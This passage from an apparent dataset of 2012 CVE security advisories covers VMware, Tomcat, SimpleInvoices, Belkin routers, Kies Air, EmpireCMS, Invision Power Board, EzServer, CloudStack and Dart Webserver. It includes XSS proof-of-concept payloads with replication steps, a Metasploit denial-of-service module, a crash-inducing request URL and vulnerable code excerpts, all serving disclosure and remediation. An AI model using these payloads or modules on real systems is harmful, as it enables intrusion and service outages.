* 2012-12-10 - Developer fixes code (George Clark) and security team
validates the fixes.
* 2012-12-10 - Extensions.PatchItem12285Contrib released for Foswiki
1.1.x
* 2012-12-10 - Security team creates advisory with hotfix.
Announcement delayed for coordination with TWiki (George Clark)
* 2012-12-12 - Updated Debian packages released (Sven Dowideit)
* 2012-12-12 - Send alert to foswiki-announce and foswiki-discuss
mailing lists ( )
* 2012-12-14 - Publish advisory in Support web and update all related
topics ( )
* 2012-12-14 - Reference to public advisory on Download page and
Known Issues ( )
* 2012-xx-xx - Release Manager builds patch release ( )
* 2012-xx-xx - Issue a public security advisory (vuln secunia com,
cert cert org, bugs securitytracker com,
full-disclosure lists netsys com, vulnwatch vulnwatch org) ( )"
9323,DDIVRT-2012-48 VMware View Connection Server Directory Traversal (CVE-2012-5978),,CVE-2012-5978,"Title
-----
DDIVRT-2012-48 VMware View Connection Server Directory Traversal (CVE-2012-5978)
Severity
--------
High
Date Discovered
---------------
September 26, 2012
Discovered By
-------------
Digital Defense, Inc. Vulnerability Research Team
Credit: r@b13$
Vulnerability Description
-------------------------
The tunnel-server component of the VMware View Connection Server fails
to ensure that each requested URL refers to a file that is both
located within the web root of the server and is of a type that is
allowed to be served.
A remote unauthenticated attacker can use this weakness to retrieve
arbitrary files from the affected server's underlying root file
system. This can be accomplished by submitting URL encoded HTTP GET
requests that traverse out of the affected subdirectory.
Solution Description
--------------------
VMware has produced a solution for the issue in the form of an upgrade
which is available through their website. The VMware advisory can be
found: http://www.vmware.com/security/advisories/VMSA-2012-0017.html
Vulnerable Software
-------------------------
VMware View 5.x prior to version 5.1.2
VMware View 4.x prior to version 4.6.2
Vendor Contact
--------------
Vendor Name: VMware, Inc.
Vendor Website: http://www.vmware.com/"
9328,Password Disclosure in D-Link IP Cameras (CVE-2012-4046),,CVE-2012-4046,"A password disclosure vulnerability in the D-Link DCS-9xx series IP cameras allows attackers to gain administrator level access to the camera when on the same broadcast domain.
CVE-2012-4046
Details:
http://www.fishnetsecurity.com/6labs/blog/password-disclosure-d-link-surveillance-cameras-cve-2012-4046"
9346,SimpleInvoices 2011.1 Cross-Site-Scripting (XSS) Vulnerabilities CVE-2012-4932,,CVE-2012-4932,"Overview
SimpleInvoices 2011.1 is vulnerable to Cross-site Scripting (XSS).
Software Description
Simple Invoices is a free, open source, web based invoicing system that you can install on your server/pc or have hosted by one of our services providers.
Vulnerability Overview
The vulnerabilities POC are as follows:
Reflective Cross-Site-Scripting (XSS)
[http://]127.0.0.1/simpleinvoices/index.php?module=invoices&view=manage&having=%3C/script%3E%3Cscript%3Ealert%28%27POC%20XSS%27%29;%3C/script%3E%3Cscript%3E
Persistent Cross-Site-Scripting (XSS)
Steps to replicate:
Add User
1) Navigate to the following URL:
http://127.0.0.1/simpleinvoices/index.php?module=user&view=add
2) Add the following javascript to the Email field:
<script>alert(�POC XSS�)</script>
3) Click �Save�
4) Application will redirect to Users page where javascript will execute.
Add Customer
1) Navigate tot he following URL:
http://127.0.0.1/simpleinvoices/index.php?module=customers&view=add
2) Add the following javascript to the Customer Name field:
<script>alert(�POC XSS�)</script>
3) Fill out the remaining compulsary fields and click �Save�
4) Application will redirect tot he Customers page and javascript will execute.
5) This action also breaks the application logic in the fact that you cannot delete the created �User� in the application, deletion must be carried out manually from the database.
Add Biller
1) Navigate to the following URL:
http://127.0.0.1/simpleinvoices/index.php?module=billers&view=add
2) Add a legitimate Biller Name such as �Test�
3) Add the following javascript to the �Street address�, �Street address 2&#8242;, �City�, �Zip code�, �State�, �Country�, �Mobile Phone�, �Phone�, �Fax�, �Email�, �PayPal business name�, �PayPal notify url�, �PayPal return url�, �Eway customer ID�, �Custom field 1&#8242;, �Custom field 2&#8242;, �Custom field 3&#8242; and �Custom field 4&#8242; fields:
<script>alert(�POC XSS�)</script>
4) Click �Save�
5) Application will redirect to the Billers page and the javascript will execute once.
6) Click the �View Test� icon and the application will execute the javascript from each of the vulnerable fields, totalling 18 alerts.
Add Invoice
1) Navigate to the following URL:
http://127.0.0.1/simpleinvoices/index.php?module=invoices&view=itemised
2) Choose the recently created Customer �<script>alert(�POC XSS�)</script>�
3) Enter any text into the remaining comulsary fields and click �Save�
3) Click �Invoices� from sub-menu
4) Javascript will execute in browser.
Process Payment
1) Navigate to the following URL:
http://127.0.0.1/simpleinvoices/index.php?module=payments&view=process&op=pay_invoice
2) Choose the recently created invoice �<script>alert(�POC XSS�)</script>�
3) Enter the following into the �Notes� field:
<script>alert(�POC XSS�)</script>
4) The application will redirect and the javascript will execute in the browser.
Payment Types
1) Navigate to the following URL:
http://127.0.0.1/simpleinvoices/index.php?module=payment_types&view=manage
2) Add the following code in the �Payment type description� field:
<script>alert(�POC XSS�)</script>
3) Click �Save�
4) The application will redirect to the �Payment Types� page and the javascript will execute in the browser
5) This action also breaks the application logic in the fact that you cannot delete the created �Payment Type� in the application, deletion must be carried out manually from the database.
Invoice Preferences
1) Navigate to the following URL:
http://127.0.0.1/simpleinvoices/index.php?module=preferences&view=add
2) Add the following code in the �Description� field:
<script>alert(�POC XSS�)</script>
3) Enter any text into the remaining comulsary fields and click �Save�
4) The application will redirect to the �Invoice Preferences� page and the javascript will execute in the browser
5) This action also breaks the application logic in the fact that you cannot delete the created �Invoice Preference� in the application, deletion must be carried out manually from the database.
Manage Products
1) Navigate to the following URL:
http://127.0.0.1/simpleinvoices/index.php?module=products&view=add
2) Add the following code in the �Description� field:
<script>alert(�POC XSS�)</script>
3) Enter any text into the remaining comulsary fields and click �Save�
4) The application will redirect to the �Manage Products� page and the javascript will execute in the browser
5) This action also breaks the application logic in the fact that you cannot delete the created �Product� in the application, deletion must be carried out manually from the database.
Tax Rates
1) Navigate to the following URL:
http://127.0.0.1/simpleinvoices/index.php?module=tax_rates&view=add
2) Add the following code in the �Description� field:
<script>alert(�POC XSS�)</script>
3) Enter any text into the remaining comulsary fields and click �Save�
4) The application will redirect to the �Tax Rates� page and the javascript will execute in the browser
5) This action also breaks the application logic in the fact that you cannot delete the created �Tax Rate� in the application, deletion must be carried out manually from the database.
Vulnerability Timeline
18-9-12 � Developer contacted
18-9-12 � CVE-2012-4932 reserved
??-10-12 � Developer release of stable-2012-1-CIS3000 - https://github.com/simpleinvoices/simpleinvoices/tree/stable-2012-1-CIS3000
9-12-12 � Mitre advised to close CVE-2012-4932"
9369,CVE-2012-4431 Apache Tomcat Bypass of CSRF prevention filter,,CVE-2012-4431,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2012-4431 Apache Tomcat Bypass of CSRF prevention filter
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.31
- - Tomcat 6.0.0 to 6.0.35
Description:
The CSRF prevention filter could be bypassed if a request was made to a
protected resource without a session identifier present in the request.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- - Tomcat 7.0.x users should upgrade to 7.0.32 or later
- - Tomcat 6.0.x users should upgrade to 6.0.36 or later
Credit:
This issue was identified by The Tomcat security team
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with undefined - http://www.enigmail.net/
iQIcBAEBAgAGBQJQvlNvAAoJEBDAHFovYFnnY80QAMvP1gIpG00vfIdiFabpJX55
UEmkPuTSefxZ6NMvAL8GkuUe8CoC6KinCgOx+s8eGlEiHtWFoYvM/Ckg8E3a8SY6
MfD8GLo2av/LdULGSCBrbaL2wFbgixPTBpgR9YS4bdpTK5nVqBZyZOjOzptqRDnE
BQXDLLKa65/z7cF57l+XcLs1+JW3KJGRiGJzBNUrJK1x/AzfgRgk4jgvYdyDWdpI
zuXKgwBbunblPL4sZhZA2mhoswBIMIJIaHXOAD28Ddt9IIae0UFptY6LmExOkSsa
PtshA4EBlO8JTPPcfwtqA/bkHAWCzB1QshkYD57rLF3t1ouDQWI6j8l+q3AYIxzv
a0Ix4qzE2hekcjGSCUMZUqNgcaGSjsggaOEo5zauM01osPQxbfpH41eH5fIWlMKi
vrxRjYJwLyLdkj3bZFuP7Uq1GL4BLjeKDfqsL4aqcfdBPZea6C9rToEkB8EjD4vf
DVdrX4Ivg3ImMMnL+gkX4+5aLp+jpw23G9gZbX1DJn+648iv3yFoK5ysOWy1GAAO
x1Iq3pa49NigJ0ipjZvxc07THIoiK/t49/3fWzMR1Xm819oJC2/Qf512l/FpEltK
kQ0y8BC4+7ypUZyhtwE3jzLW1x2j4ZBK8l1nX0X92WepJ6piro/7o80qiyDMfqPC
hbmBu213eSXnV9kRHveI
=jich
-----END PGP SIGNATURE-----"
9370,CVE-2012-3546 Apache Tomcat Bypass of security constraints,,CVE-2012-3546,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2012-3546 Apache Tomcat Bypass of security constraints
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.29
- - Tomcat 6.0.0 to 6.0.35
Earlier unsupported versions may also be affected
Description:
When using FORM authentication it was possible to bypass the security
constraint checks in the FORM authenticator by appending
""/j_security_check"" to the end of the URL if some other component (such
as the Single-Sign-On valve) had called request.setUserPrincipal()
before the call to FormAuthenticator#authenticate().
Mitigation:
Users of affected versions should apply one of the following mitigations:
- - Tomcat 7.0.x users should upgrade to 7.0.30 or later
- - Tomcat 6.0.x users should upgrade to 6.0.36 or later
Credit:
This issue was identified by The Tomcat security team
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with undefined - http://www.enigmail.net/
iQIcBAEBAgAGBQJQvlNnAAoJEBDAHFovYFnnsJoP/i6/NEKy6+tAcMZ0vKV5CGci
2Epf7NbfWHZhyYZlI445kHoCGQAvMaD0pXlLBUTlzVd2N9Jugk1j2WNPzvOlsaZ0
jx3qeuvNhVZzAa2LIDVSj8ENVNYMiA/S4reZu2u9lHqw5tTP5fapJXDNphSnr0kR
A662JdkQlirQtFylkvqFdMoZ3N/vEPwzD8Cs80fafEhEqcoOtrO6yOyaR/kwEFeI
5cxbm/om4+T9cVkRduGqhzLRBWnDiCeBguXiUJXDQorOWmzHq438cNd4ylfFRa1W
RBsin8aVY6LMIUqdWWqUnG8SPI7qp7odMRzhI1yLw+y4ykrV5coKeTvalIsh+3ZE
FWP7kYmrOYS8NToq56Fxn8bYAuAsJiOsVZ4ox0ozR9HQCEqLEpXTa31hEowUBtig
LO0HRgQIeh4rdgxxR2V46JiRw8URNfGevKrhez5B8UAb8hj02SM/3hyg3S3pL2Jn
fl0vLnf1+DACd0mUuGmSQNLx5VznW6fkYHZWgmV3SigaroKL4+BbqCO7WvuNs9aA
Y8dYt08IgF0O/Kt1vQdks31KEDIqHJOtrZBCySdvVLGz1x+MxluWssZGQELCcj0v
ByfH80yh/uIU2Zk9QTaJlEkuODyWTYxmYRk34R3/zZ57za+NQLlpe0cfBRy33wjt
VCfhXK6n3npDlmhpeBDw
=pOlX
-----END PGP SIGNATURE-----"
9371,CVE-2012-4534 Apache Tomcat denial of service,,CVE-2012-4534,"CVE-2012-4534 Apache Tomcat denial of service
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
- Tomcat 7.0.0 to 7.0.27
- Tomcat 6.0.0 to 6.0.35
Description:
When using the NIO connector with sendfile and HTTPS enabled, if a
client breaks the connection while reading the response an infinite loop
is entered leading to a denial of service. This was originally reported
as https://issues.apache.org/bugzilla/show_bug.cgi?id=52858.
Mitigation:
Users of affected versions should apply one of the following mitigations:
- Tomcat 7.0.x users should upgrade to 7.0.28 or later
- Tomcat 6.0.x users should upgrade to 6.0.36 or later
Credit:
The security implications of this bug were identified by Arun Neelicattu
of the Red Hat Security Response Team.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html"
9441,Re: CVE-2012-4366: Insecure default WPA2 passphrase in multiple Belkin wireless routers,,CVE-2012-4366,"Hi!
On 19/11/12 17:28, nauty.me04 gmail com wrote:
> Jakob whart difference would it make to use a OCLhashcat with rainbow tables for simply cracking the key?
The problem with rainbow tables for WPA2-PSK is that a rainbow table can only be created for one specific network name (ESSID). The default wireless network configured by Belkin has a network name such as ""Belkin.34cb"". Having this additional three or four hex digits means that one had to create 4096 or 65,536 different rainbow tables with each of them containing a large percentage of the 2^32 possible keys. While this may in theory be feasible, creating the rainbow tables would require a significant amount of computation power and storage.
>
> Why would the hacker make such a hard attempt to crack the key. Can't this be stripped down to simple brute force
Given the fact that the key can be calculated solely based on the publicly visible mac address (BSSID) of the wireless network (with some minor variations between the different router models), doing the actual brute force is not required to crack the key.
Regards
Jakob Lell"
9443,CVE-2012-4366: Insecure default WPA2 passphrase in multiple Belkin wireless routers,,CVE-2012-4366,"CVE-2012-4366: Insecure default WPA2 passphrase in multiple Belkin wireless routers
I. Background
Belkin ships many wireless routers with an encrypted wireless network configured by default. The network name (ESSID) and the (seemingly random) password is printed on a label at the bottom of the device.
II. Description of vulnerability
Having a preconfigured randomly generated WPA2-PSK passphrase for wireless routers is basically a good idea since a vendor-generated passphrase can be much more secure than most user-generated passwords. However, in the case of Belkin the default password is calculated solely based on the mac address of the device. Since the mac address is broadcasted with the beacon frames sent out by the device, a wireless attacker can calculate the default passphrase and then connect to the wireless network.
Each of the eight characters of the default passphrase are created by substituting a corresponding hex-digit of the wan mac address using a static substitution table. Since the wan mac address is the wlan mac address + one or two (depending on the model), a wireless attacker can easily guess the wan mac address of the device and thus calculate the default WPA2 passphrase.
Moreover, the default WPA2-PSK passphrase solely consists of 8 hexadecimal digits, which means that the entropy is limited to only 32 bits (or 33 bits since some models use uppercase hex digits). After sniffing one successful association of a client to the wireless network, an attacker can carry out an offline brute-force attack to crack the password. The program oclhashcat-plus can try 131,000 passwords per second on one high end GPU (AMD Radeon hd7970) [1]. Doing a full search of the 32-bit key space takes about 9 hours at this rate.
III. Impact
An attacker can exploit this vulnerability to calculate the WPA2-PSK passphrase of a wireless network. This allows sniffing and decrypting all wireless traffic in a purely passive attack given that the attacker has also sniffed the association.
The attacker may also connect to the wireless network, which may allow further exploitation of unprotected systems in the local network. An attacker may furthermore use the wireless network to access the internet from the owner's network. The network owner may then be held responsible for any illegal activities perpetrated by the unauthorized users.
IV. Affected devices
Belkin Surf N150 Model F7D1301v1
The official Belkin support page [2] contains pictures of the label of several other WiFi devices, which show that the following devices are vulnerable as well:
Belkin N900 Model F9K1104v1
Belkin N450 Model F9K1105V2
The following device uses a variation of the algorithm and the password consists of uppercase hex digits. When using our algorithm with the wlan mac of the device, the first 5 digits of the password are calculated correctly. It is likely that the algorithm differs only in the tables used.
Belkin N300 Model F7D2301v1
It is likely that other Belkin devices are affected as well. Unfortunately, Belkin has not yet cooperated with us to fix the vulnerability and/or confirm a list of other affected devices. If you own a Belkin wireless router and want to know whether it is vulnerable as well, you should change the passphrase and then send me the relevant data (model number, wan/wlan mac address and original, default WPA2 passphrase).
V. Solution
Users of potentially affected wireless routers should change the wireless passphrase to something more secure.
VI. Timeline
6.1.2012: Vendor contacted
27.1.2012: Escalated
29.10.2012: Another contact attempt, still no response
19.11.2012: Public disclosure
VII. Credits
Jakob Lell
Jï¿½rg Schneider
VIII. References
Advisory location: http://www.jakoblell.com/blog/?p=15
CVE-2012-4366: http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4366
[1] http://hashcat.net/oclhashcat-plus/
[2] http://en-us-support.belkin.com/app/answers/detail/a_id/6989"
9451,[CVE-2012-5858] [CVE-2012-5859] DoS/Authorization Bypass - Kies Air,,CVE-2012-5858,"Name: [CVE-2012-5858] [CVE-2012-5859] DoS/Authorization Bypass - Kies Air
Package: com.samsung.swift.app.kiesair
Affected versions: 2.1.207051, 2.1.210161
Testing Device: Samsung S3 (AT&T) - SAMSUNG-SGH-I747
Android Version: 4.0.4/ Build Number: IMM76D.I747UCALH9
Vendor homepage: http://www.samsung.com/us/kiesair
Researcher: Claudio J. Lacayo
APPLICATION OVERVIEW
======================
Kies Air is a application that enables you to easily manage contents saved on your device via PC internet or mobile browser using Wi-Fi technology. Without having to connect any cables, within a browser you can use diverse function such as multimedia transfer, music listening, PIMS management, text message, file search, and so on.
VULNERABILITY SUMMARY
=======================
The default application behaviour of the Kies Air application was analyzed uncovering a local authorization bypass attack that allows a malicious attacker to obtain the full contents of the phone. Kies Air uses IP based authorization to allow access to the owners device via a web browser. The application has support for HTTPS but does not use it. Once a request is granted to an IP, an attacker can spoof the IP, de-authenticate the authorized client and assume the IP to retrieve content without alarming the user. It was also found that a specially crafted request can cause the application to crash at will. This DoS attack only requires the application to be running.
DETAILS
=======
Authorization Bypass:
A series of HTTP requests are made when the client connects to the Kies Air web server. The server responds with two 301 responses. The first 301 Moved Permanently response points to http://{TARGET_IP}:8080/www/index.html followed by another 301 pointing to a new URI location at: http://{TARGET_IP}:8080/www/index.gz.html - if the user is allowed access, the server responds with 200 OK otherwise a 401 Unauthorized response is returned.
Once the Kies Air web server is identified a de-authentication request can be sent to remove the authorized user on the network and obtain the authorized IP. Requesting access to Kies Air does not require the client to re-authenticate nor alert the mobile user that another connection attempt is being made.
Denial of Service:
Send GET request http://{TARGET_IP}:8080/www/apps/KiesAir/jws/ssd.php?E&
ADVISORY TIMELINE
=================
10/16/2012 - Authorization bypass found and confirmed
10/20/2012 - DoS found and confirmed
11/5/2012 - Vendor notified via email to Kies Air Support team.
11/6/2012 - Kies Air support team responds, requests vulnerability details to forward to Kies Air Development team. Whitepaper and code provided
11/10/2012 - Member from Mobile Security Team requests vulnerability disclosure extension. Due to severity and attack scope request denied and issue details published.
11/11/2012 - Advisory released.
CVSS 2.0 Base Metrics
==================
Reference Base Vector Base Score
CVSS Base Score
6.1
Impact Subscore
8.5
Exploitability Subscore
3.9
CVSS Temporal Score
5.3
CVSS Environmental Score
4.2
Modified Impact Subscore
6.7
Overall CVSS Score
4.2
RESOLUTION
===========
Upgrade the latest version of Kies Air to 2.2.211081 released November 8th, 2012.
REFERENCES
============
Whitepaper: http://dl.dropbox.com/u/7779799/SamsungKiesAirAuthorizationBypassandDoS.pdf
PoC: https://github.com/cjlacayo/bash/blob/master/KiesAir/kiesauth.sh"
9482,[CVE-2012-5777]EmpireCMS Template Parser Remote PHP Code Execution Vulnerability,,CVE-2012-5777,"# Exploit Title: EmpireCMS Template Parser Remote PHP Code Execution Vulnerability
# Date: 2012-11-1
# Author: flyh4t
# Software Link: http://www.phome.net
# Version: EmpireCMS 6.6
# CVE :
EmpireCMS Template Parser Remote PHP Code Execution Vulnerability
---------------------------------
By fly
Mail:phpsec hotmail com
Site:bbs.wolvez.org
---------------------------------
Empire CMS is a widely used CMS in china. Official website is www.phome.net.
I have found a remote PHP code-execution vulnerability in EmpireCMS 6.6 (the lastest version).
This issue occurs in the application's template parser.
An
attacker can exploit this issue by enticing an unsuspecting victim to
install a malicious template,can inject and execute arbitrary malicious
PHP code in the context of the webserver process.
This may facilitate a compromise of the application and the underlying system; other attacks are also possible.
[-] details :
Here is a function for template parser in /e/class/connect.php
---------------------------------
function ReplaceListVars($no,$listtemp,$subnews,$subtitle,$formatdate,$url,$haveclass=0,$r,$field,$docode=0){
    global $empire,$public_r,$class_r,$class_zr,$fun_r,$dbtbpre,$emod_r,$class_tr,$level_r,$navclassid,$etable_r;
    if($haveclass)
    {
        $add=sys_ReturnBqClassname($r,$haveclass);
    }
    if(empty($r[oldtitle]))
    {
        $r[oldtitle]=$r[title];
    }
    if($docode==1)
    {      
                //here is the vul code
                //$listtemp is passed to function eval and not checked.
        $listtemp=stripSlashes($listtemp);
        eval($listtemp);
    }
   
        ......
}
---------------------------------
Many other files used this function,here is one place:
---------------------------------
// /e/action/ListInfo/index.php line 120
//get template from datebase which may contain PHP code we have injected into database.
$tempr=$empire->fetch1(""select
tempid,temptext,subnews,listvar,rownum,showdate,modid,subtitle,docode
from "".GetTemptb(""enewslisttemp"")."" where tempid='$tempid'"");
......
$listtemp=$tempr[temptext];
$rownum=$tempr[rownum];
if(empty($rownum))
{$rownum=1;}
$formatdate=$tempr[showdate];
$subnews=$tempr[subnews];
$subtitle=$tempr[subtitle];
$docode=$tempr[docode];
$modid=$tempr[modid];
$listvar=str_replace('[!--news.url--]',$public_r[newsurl],$tempr[listvar]);
// $listvar contain PHP code we have injected
......
while($r=$empire->fetch($sql))
{
    $repvar=ReplaceListVars($no,$listvar,$subnews,$subtitle,$formatdate,$url,$have_class,$r,$ret_r,$docode);
    //here lead to execute php code
------------------------------
[-] Disclosure timeline:
[19/10/2012] - Vulnerability discovered
[20/10/2012] - Vendor notified，No responsed
[01/11/2012] - CVE number requested
[02/11/2012] - Assigned CVE-2012-5777
[05/11/2012] - Public disclosure"
9496,"[CVE-2012-5692] Invision Power Board <= 3.3.4 ""unserialize()"" PHP Code Execution Vulnerability",,CVE-2012-5692,"------------------------------------------------------------------------------
Invision Power Board <= 3.3.4 ""unserialize()"" PHP Code Execution Vulnerability
------------------------------------------------------------------------------
author..............: Egidio Romano aka EgiX
mail................: n0b0d13s[at]gmail[dot]com
software link.......: http://www.invisionpower.com/
[-] Vulnerable code in IPSCookie::get() method defined in /admin/sources/base/core.php
4015. static public function get($name)
4016. {
4017. // Check internal data first
4018. if ( isset( self::$_cookiesSet[ $name ] ) )
4019. {
4020. return self::$_cookiesSet[ $name ];
4021. }
4022. else if ( isset( $_COOKIE[ipsRegistry::$settings['cookie_id'].$name] ) )
4023. {
4024. $_value = $_COOKIE[ ipsRegistry::$settings['cookie_id'].$name ];
4025.
4026. if ( substr( $_value, 0, 2 ) == 'a:' )
4027. {
4028. return unserialize( stripslashes( urldecode( $_value ) ) );
4029. }
The vulnerability is caused due to this method unserialize user input passed through cookies without a proper
sanitization. The only one check is done at line 4026, where is controlled that the serialized string starts
with 'a:', but this is not sufficient to prevent a ""PHP Object Injection"" because an attacker may send a
serialized string which represents an array of objects. This can be exploited to execute arbitrary PHP code
via the ""__destruct()"" method of the ""dbMain"" class, which calls the ""writeDebugLog"" method to write debug
info into a file. PHP code may be injected only through the $_SERVER['QUERY_STRING'] variable, for this
reason successful exploitation of this vulnerability requires short_open_tag to be enabled.
[-] Disclosure timeline:
[21/10/2012] - Vulnerability discovered
[23/10/2012] - Vendor notified
[25/10/2012] - Patch released: http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-security-update
[25/10/2012] - CVE number requested
[29/10/2012] - Assigned CVE-2012-5692
[31/10/2012] - Public disclosure
[-] Proof of concept:
http://www.exploit-db.com/exploits/22398"
9564,[CVE-2012-4750] Ezhometech EzServer 7.0 Remote Heap Corruption Vulnerability,,CVE-2012-4750,"[Title]:
Ezhometech EzServer 7.0 Remote Heap Corruption Vulnerability
[Description]:
EzServer is a software for audio and video streaming adopted by various companies worldwide. Version 7.0 is affected by a remote heap corruption vulnerability. Version 6.x is not affected by this issue, as does not implement RTMP support.
[Affected Software]:
http://www.ezhometech.com/ezserver.htm
[Credits]:
Lorenzo Cantoni
[CVE]:
CVE-2012-4750
[CVSS]:
9.3 (AV:N/AC:M/Au:N/C:C/I:C/A:C)
[Impact]:
A remote unauthenticated attacker can DoS the application. Remote Command Execution could be possible, however an exploit has yet to be developed.
[Details]:
The vulnerability is caused by the following lines of code:
.text:00474533 cmp [ebp-33A0], 80h
.text:0047453D jle short loc_47458E
.text:0047453F mov eax, [ebp-33A0h]
.text:00474545 sub eax, 80h
.text:0047454A push eax ; Size
.text:0047454B mov ecx, [ebp-33CCh]
.text:00474551 add ecx, 81h
.text:00474557 push ecx ; Src
.text:00474558 mov edx, [ebp-33CCh]
.text:0047455E add edx, 80h
.text:00474564 push edx ; Dst
.text:00474565 call _memcpy_0
The application pass to memcpy() an uncontrolled size, which is directly taken from the AMF request in the RTMP packet.After have successfully completed the RTMP handshake, an attacker can send a malformed AMF request embedded in the RTMP session, with an high value for the 'size' field (2 bytes, such as 0xFFFF) and a lower-sized 'string' (such as 'connect'). This result in a heap corruption and a crash for the application.
[Fix]:
Support for the RTMP protocol appears disabled (but not fully removed) in version 7.1. However there is no official response from the vendor (see disclosure).
[Proof of Concept code]:
http://pastebin.com/k05djr6C
[Disclosure]:
09/09/2012: Vendor contacted.
07/10/2012: No response. Sent another mail.
13/10/2012: Still no response. Disclosure."
9586,[CVE-2012-4501] CloudStack configuration vulnerability,,CVE-2012-4501,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2012-4501: Apache CloudStack configuration vulnerability
Severity: Critical
Vendors:
The Apache Software Foundation
Citrix, Inc.
Versions Affected:
As no official releases have been made, this does not affect any
official Apache CloudStack releases.
Anybody using a version of CloudStack generated from the Apache
CloudStack source tree prior to October 7th, 2012 will need to take
the actions specified below. Please note this includes both Citrix
CloudStack commercial and open-source, pre-ASF versions.
Description:
The CloudStack PPMC was notified of a configuration vulnerability that
exists in development versions of the Apache Incubated CloudStack
project. This vulnerability allows a malicious user to execute
arbitrary CloudStack API calls. A malicious user could, for example,
delete all VMs in the system.
Addressing this issue is especially important for anybody using
CloudStack in a public environment.
Mitigation:
1) Login to the CloudStack Database via MySQL
$ mysql -u cloud -p -h host-ip-address
(enter password as prompted)
2) Disable the system user and set a random password:
mysql> update cloud.user set password=RAND() where id=1;
3) Exit MySQL
mysql> q
Alternatively, users can update to a version of CloudStack based on
the git repository on or after October 7th, 2012.
Credit:
This issue was identified by Hugo Trippaers of Schuberg Philis.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG/MacGPG2 v2.0.17 (Darwin)
Comment: GPGTools - http://gpgtools.org
Comment: Using GnuPG with Mozilla - http://www.enigmail.net/
iQIcBAEBCgAGBQJQcebmAAoJEOom9N0pCN7SdZwQAKd82/zTgWAMibLYhgnsiKDo
hJ/O0kNxP3MUGN5L131K61titfZ9se37z2dmBpBEYKc5X3jHkbnG+o7vPSyD9Bc6
+UzddIkkUy/eXZSNuFXdth+GTFKuCBhbMpWzRYYzXLU+v6G8YqwdZGdUyNTp8oi1
MnQ/2KvLCAi5hiG1YeZCXnNdDyv2fLGW6phbS5UTsG8OLUDZe2Ycerjw+zl88BCi
MhgHpBwOti8mikTrodEWG5lSlIksVOHnLPA2Ycz4QSGnqK6VhyCfQWNJeMq+/TGK
JYc30c0DiUsCDjXCsymxWyEmK9ePFWxOLzvFYYRA/Iuhg9J89ADvHr1JM8QEoFGV
cOt1YLV+zTKuUhxCx0nHTVUxBS9A2Giez3GyPQ+WmW7ph2erC7GL7oKdLtdgJBBc
odlf8F+0xREQocqi85t9v65PDXRjOdmAfaGwogzibIA9sweDlefhMTzCgSsAtIKF
+hkHqZD2oRP4YxQ05vp8CSXBf4UCVx7169nSu9GA3HjllsXNqyhY0h1hjkZkBcd1
To5Rfd0bVNNoxMyfdCA9sd5fQZ1XTivwRpBGkEWJirxM7Z7hFddDQdqebeeBExk/
yE+geeNcK2RMl5Tqtzkbs9DeLnijJyRuU1xzRHQOsXLSp/RYaZlrEnd/UzxZ+9up
bvYem89raMxulY7lzngu
=+bQS
-----END PGP SIGNATURE-----"
9632,CVE-2012-3819: Stack Overflow in DartWebserver.dll <= 1.9,,CVE-2012-3819,"Overview
===============
DartWebserver.Dll is an HTTP server provided by Dart Comunications
(dart.com). It is distributed intheir PowerTCP/Webserver For ActiveX
product and likely other similar products.
""Build web applications in any familiar software development
environment. Use WebServer for ActiveX to add web-based access to
traditional compiled applications.""
Version 1.9 and prior is vulnerable to a stack overflow exception,
these maybe generated by producing large requests to the application,
e.g. ""a"" * 5200000 + "" ""
Analysis
===============
During the processing of incoming HTTP requests the server collects
data until it encounters a "" "" sentinel. If the request is large,
multiple copies are made and stored on the stack, this consumes the
amount of stack space available to the process quickly, leading to a
stack overflow exception being thrown. This exception is not handled
and will typically lead to the termination of the parent process. Some
variations may exist per system depending on pre-existing memory
conditions and modification of Proof Of Concept (PoC) code may be
necessary to reproduce the exception.
Timeline
===============
10/20/2011 - Discovered the bug in an affected vendor application
10/20/2011 - Contacted affected vendor
10/21/2011 - Affected vendor replies stating they can not get the
product vendor to create a fix
06/29/2012 - CVE assignment
08/08/2012 - Contacted product vendor providing specifics
08/20/2012 - Product vendor created an issue number (#5654) for the
bug, but reply ""there are not immediate plans to resolve the issue""
09/28/2012 - Posting to bugtraq, for the first time ever ;-)
PoC (MSF Module)
===============
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::Tcp
include Msf::Auxiliary::Dos
def initialize(info = {})
super(update_info(info,
'Description' => %q{ 'Name' => 'Dart Webserver
<= 1.9.0 Stack Overflow',
Dart Webserver from Dart Communications throws a stack
overflow exception
when processing large requests.
}
,
'Author' => [
'catatonicprime'
],
'Version' => '$Revision: 15513 $',
'License' => MSF_LICENSE,
'References' => [
[ 'CVE', '2012-3819' ],
],
'DisclosureDate' => '9/28/2012'))
register_options([
Opt::RPORT(80),
OptInt.new('SIZE', [ true, 'Estimated stack size to exhaust',
'520000' ])
])
end
def run
serverIP = datastore['RHOST']
if (datastore['RPORT'].to_i != 80)
serverIP += "":"" + datastore['RPORT'].to_s
end
size = datastore['SIZE']
print_status(""Crashing the server ..."")
request = ""A"" * size + "" ""
connect
sock.put(request)
disconnect
end
end"
9653,CVE-2012-4415: guacamole local root vulnerability,,CVE-2012-4415,"Overview
========
""Guacamole is an HTML5 web application that provides access to desktop
environments using remote desktop protocols such as VNC or RDP. A
centralized server acts as a tunnel and proxy, allowing access to
multiple desktops through a web browser. No plugins are needed: the
client requires nothing more than a web browser supporting HTML5 and
AJAX.""
-- http://guac-dev.org/
